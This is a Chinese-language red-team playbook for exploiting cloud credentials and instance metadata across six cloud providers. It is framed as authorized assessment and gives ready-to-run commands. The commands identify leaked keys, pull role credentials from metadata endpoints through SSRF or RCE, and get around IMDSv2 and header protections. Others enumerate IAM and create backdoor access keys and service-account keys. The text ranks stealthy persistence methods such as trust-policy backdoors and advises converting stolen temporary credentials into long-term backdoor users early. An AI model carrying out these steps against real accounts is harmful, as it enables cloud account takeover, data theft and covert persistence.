# 云凭据 / IAM / 元数据利用链（进阶）

> 适用：拿到一串 AK/SK、临时凭据或一个 SSRF/RCE 点，需要在最短时间内判断"能不能用、能干什么、怎么从一条凭据扩到一摊云资源"的授权评估。

## 认什么

**凭据格式识别（先定平台，再选 CLI）**

| 平台 | 长期凭据 | 临时凭据 | 补充 |
|---|---|---|---|
| AWS | `AKIA` + 20 字符 | `ASIA` + SessionToken | SessionToken 每次调用都要带 |
| 腾讯云 | `AKID` 开头 SecretId（36 字符）+ SecretKey | TmpSecretId/TmpSecretKey + Token | Token 字段必带，有效期最长 2 小时 |
| 阿里云 | `LTAI` 开头 AccessKeyId | `STS.` 开头 + SecurityToken | 15 分钟 ~ 12 小时 |
| 华为云 | AK/SK 约 20 字符、无固定前缀 | AK/SK + SecurityToken 或 `X-Auth-Token`（24h） | IAM 基于 Keystone |
| GCP | SA JSON：`"type": "service_account"` + `private_key` | OAuth `ya29.`、OIDC JWT | Scope 会限制 Token 能力 |
| Azure | `client_id`(GUID) + secret/证书 + `tenant_id` | Access Token `eyJ0...`、Refresh `0.ARMA...` | SP 不受 MFA/CA 限制 |

**来源与优先级**：`.env`/应用配置/前端 JS/git 历史/CI secret/tfstate/user-data/元数据/日志/SSL 证书私钥/KMS 密文；从"日志与备份"里翻出的长期凭据往往比临时凭据更值钱。

**蜜罐判断**：来源过于"顺手"（公开桶、明摆的配置、注释里写着测试用）时先怀疑；AWS 用 `aws sts get-access-key-info --access-key-id AKIA...` 查归属账户与目标主体比对，不符就降速。

**元数据可达性线索**：响应头 `x-amz-*`/`x-ms-*`/`x-goog-*`/`x-oss-*`/`x-cos-*`；云厂商域名；实例内可访问 `169.254.169.254`（AWS/Azure/GCP/华为）或 `100.100.100.200`（阿里）/`metadata.tencentyun.com`（腾讯）。

**时间窗**：临时凭据 15 分钟起步，GCP/Azure Access Token 约 1 小时；拿到后先做"转移"（新建长期 AK/后门用户），再做广度枚举。

## 打哪（命令）

**Phase 0：配置与身份确认（前 2 分钟）**

```bash
# AWS
export AWS_ACCESS_KEY_ID="AKIA..."; export AWS_SECRET_ACCESS_KEY="..."; export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
# 腾讯云
export TENCENTCLOUD_SECRET_ID="AKID..."; export TENCENTCLOUD_SECRET_KEY="..."; export TENCENTCLOUD_SESSION_TOKEN="..."
tccli sts GetCallerIdentity
# 阿里云
export ALIBABA_CLOUD_ACCESS_KEY_ID="LTAI..."; export ALIBABA_CLOUD_ACCESS_KEY_SECRET="..."
aliyun sts GetCallerIdentity
# 华为云 / GCP / Azure 各自验证
openstack token issue; gcloud auth list; az account show
```

**Phase 1：权限枚举与逐服务探测**

- AWS：`aws iam list-attached-user-policies`/`list-user-policies`/`list-groups-for-user` → 组策略 → `get-policy-version`；再 `s3 ls`、`ec2 describe-instances`、`lambda list-functions`、`secretsmanager list-secrets` 逐个试。
- 腾讯 CAM：`tccli cam GetAccountSummary`、`ListUsers`、`DescribeRoleList`、`ListPolicies --Scope Local`、`GetPolicy --PolicyId X`、`ListAccessKeys`、`GetRole`（看信任策略）。
- 阿里 RAM：`aliyun ram ListUsers`、`ListPoliciesForUser`、`ListAccessKeys --UserName X`、`ListRoles`。
- 通用判据：能操作 IAM/CAM/RAM 本身才叫提权面；只有数据读权限时，转向"找更多凭据"。

**Phase 2：元数据（五云端点与 Header 差异）**

```bash
# AWS：IMDSv1 直 GET；IMDSv2 先 PUT 拿 token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure：必须 Metadata: true，resource 决定 token 用途
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP：必须 Metadata-Flavor: Google
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# 阿里云 / 腾讯云：不需要 Header
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
# 华为云：同 IP、OpenStack 路径
curl -s http://169.254.169.254/openstack/latest/securitykey
```

**IMDSv2 与 Header 防护的绕过面**：纯 GET 型 SSRF 打不了 IMDSv2（要 PUT + 自定义 Header）、打不了 Azure/GCP（要 Header）；换点思路是 `http://[::ffff:169.254.169.254]/`、DNS rebinding、302 重定向、找能自定义 Header 的 SSRF，或换到有 RCE 的点直接 `curl`。阿里云与腾讯云不强制 Token，SSRF 可直达。

**Phase 3：元数据 → STS/角色 → 横向**

- AWS：`security-credentials/<role>` 返回 `AccessKeyId(ASIA)/SecretAccessKey/Token` → 配置后 `sts get-caller-identity`，再按 Phase 1 枚举；可重复取以续期。
- Azure：Managed Identity token 换 `management.azure.com` 资源 → `az`/ARM 枚举；换 `graph.microsoft.com` 则走 Entra 侧。
- GCP：`default/token` 拿 OAuth token → 项目资源枚举；Scope 只读时转找 SA Key 文件。
- 阿里/腾讯：配置 STS 后打 OSS/ECS 与 COS/CVM/SCF/CAM。
- 横向三方向：角色信任策略（`Principal:*`/外部账户）、同 VPC 内其他实例（再取元数据拿不同角色）、User-Data 里可能还有长期 AK。

**Phase 4：提权与持久化（有 IAM 写权限才有）**

```bash
aws iam create-access-key --user-name TARGET          # AWS 后门 AK
aliyun ram CreateAccessKey --UserName TARGET          # 阿里 RAM
tccli cam CreateAccessKey --TargetUin TARGET_UIN      # 腾讯 CAM
curl -X POST "https://iam.cn-north-4.myhuaweicloud.com/v3.0/OS-CREDENTIAL/credentials" \
  -H "X-Auth-Token: $TOKEN" -H "Content-Type: application/json" \
  -d '{"credential": {"user_id": "TARGET_USER_ID", "description": "backup"}}'   # 华为 IAM
gcloud iam service-accounts keys create backdoor.json --iam-account=SA@PROJECT.iam.gserviceaccount.com
```

持久化按隐蔽性排序：角色信任策略后门（改 `AssumeRolePolicyDocument` 允许外部账户）> 策略版本后门（`--no-set-as-default` 后择机切默认）> 新建后门用户 + AK > 只加权限不动结构。所有动作落审计日志（CloudTrail/CloudAudit/ActionTrail 等），评估里要写明可见性。

## 什么算成

- 凭据：身份确认返回真实 Account/Project/Uin（AWS `get-caller-identity`、阿里 `GetCallerIdentity`、腾讯 `GetCallerIdentity`、GCP `projects get-iam-policy`、Azure `az account show`），并至少完成一次数据面或提权 API。
- 元数据：返回角色名 + 凭据三元组，且该凭据能成功调用云 API（换身份成功），不是只拿到 JSON。
- 横向：能用临时凭据进入下一层（另一个账户/另一个服务/另一台机器），并有对照证据。
- 持久化：新建的后门凭据能独立完成原身份做不到的动作；仅在授权明确允许持久化时做，做完清理。

## 假点

- 凭据能列空桶/Describe 全空：可能只是只读沙箱或别人的资源，不算接管。
- 元数据 301/302/403：代理、Header、网络策略问题；多次换形态仍失败才停。
- IMDSv2 下 GET 返回 401 属正常防护，不是"没有元数据服务"；纯 SSRF 做不到就换 RCE 点。
- 腾讯 `tccli cos` 不支持对象级操作，别误判成"无 COS 权限"（换 coscmd/coscli/SDK）。
- 阿里 `Throttling.User`、腾讯 `RequestLimitExceeded` 是限流，不是无权限。
- 新建 AK 立刻被删或有告警：说明有安全运营在盯，立即停止持久化动作，转报告数据面结论。
- 一旦发现凭据属于第三方/代运维主体（COS 的 appid、账户所有者与目标不符），立即停手并说明边界。

## 与其他包联动

- 六云判型与首枪：`cloud-01-多云资产与攻击面概览.md`；国内云专项：`cloud-04-国内云.md`
- AWS 提权/后渗透深链：`cloud-02-AWS攻击面与IAM提权.md`；Azure/GCP：`cloud-03-Azure与GCP.md`
- 元数据 × SSRF：`../../web-ssrf-render/knowledge/ssrf-internal-network-02-二、云元数据-打内网核心.md`
- 密钥从 JS/配置还原：`../../web-recon/knowledge/unauth-path-key-hunt-07-P4-密钥还原与鉴权证伪.md`；报告口径：`../../../../rules/40-evidence-report.md`
